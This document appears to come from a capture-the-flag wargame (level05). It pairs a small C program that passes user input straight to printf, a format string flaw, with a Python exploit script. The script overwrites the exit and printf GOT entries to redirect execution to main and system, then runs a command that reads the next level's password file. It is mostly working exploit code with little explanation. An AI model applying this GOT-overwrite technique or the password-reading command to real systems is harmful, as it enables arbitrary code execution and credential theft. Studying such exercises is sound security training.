#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
	char buffer[100];
	unsigned int index = 0;

	if (fgets(buffer, sizeof(buffer), stdin) == NULL) {
		exit(0);
	}

	index = 0;
	while (index < strlen(buffer)) {
		unsigned char current = (unsigned char)buffer[index];

		if (current > 0x40 && current <= 0x5a) {
			buffer[index] = (char)(current ^ 0x20);
		}

		index++;
	}

	printf(buffer);
	exit(0);
}




python - <<'PY'
import struct, subprocess, time, select, sys

BIN = "/home/users/level05/level05"

EXIT_GOT   = 0x080497e0
PRINTF_GOT = 0x080497d4
MAIN       = 0x08048444
SYSTEM     = 0xf7e6aed0   # replace if your gdb says different
IDX        = 10

def p32(x):
    return struct.pack("<I", x)

def fmt2(addr, value, idx):
    lo = value & 0xffff
    hi = (value >> 16) & 0xffff

    if lo <= hi:
        a1, v1, i1 = addr, lo, idx
        a2, v2, i2 = addr + 2, hi, idx + 1
    else:
        a1, v1, i1 = addr + 2, hi, idx
        a2, v2, i2 = addr, lo, idx + 1

    payload = p32(a1) + p32(a2)
    count = 8

    pad1 = (v1 - count) % 0x10000
    if pad1 == 0: pad1 = 0x10000
    payload += "%%%dx%%%d$hn" % (pad1, i1)
    count = (count + pad1) % 0x10000

    pad2 = (v2 - count) % 0x10000
    if pad2 == 0: pad2 = 0x10000
    payload += "%%%dx%%%d$hn" % (pad2, i2)

    return payload

p = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def recv_some():
    out = ""
    while True:
        r, _, _ = select.select([p.stdout], [], [], 0.2)
        if not r:
            break
        chunk = p.stdout.read(4096)
        if not chunk:
            break
        out += chunk
    if out:
        sys.stdout.write(out)

def sendline(s):
    if isinstance(s, unicode):
        s = s.encode("latin-1")
    p.stdin.write(s + "\n")
    p.stdin.flush()
    time.sleep(0.2)
    recv_some()

# stage 1: exit -> main
sendline(fmt2(EXIT_GOT, MAIN, IDX))

# stage 2: printf -> system
sendline(fmt2(PRINTF_GOT, SYSTEM, IDX))

# stage 3: clean command only
sendline("cat /home/users/level06/.pass")

# optional: keep interactive-ish
sendline("id")
time.sleep(0.2)
recv_some()
PY